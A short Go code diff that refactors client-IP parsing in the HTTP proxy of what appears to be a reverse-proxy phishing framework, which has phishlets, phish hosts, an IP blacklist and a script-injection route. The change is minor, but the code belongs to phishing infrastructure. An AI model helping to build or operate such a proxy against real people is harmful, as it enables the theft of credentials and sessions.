@@ -153,8 +153,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// handle ip blacklist
 			from_ip := req.RemoteAddr
 			if strings.Contains(from_ip, ":") {
-				from_ip = strings.Split(from_ip, ":")[0]
+				from_ip = strings.SplitN(from_ip, ":", 2)[0]
 			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -186,8 +187,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
-			parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			remote_addr := parts[0]
+			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
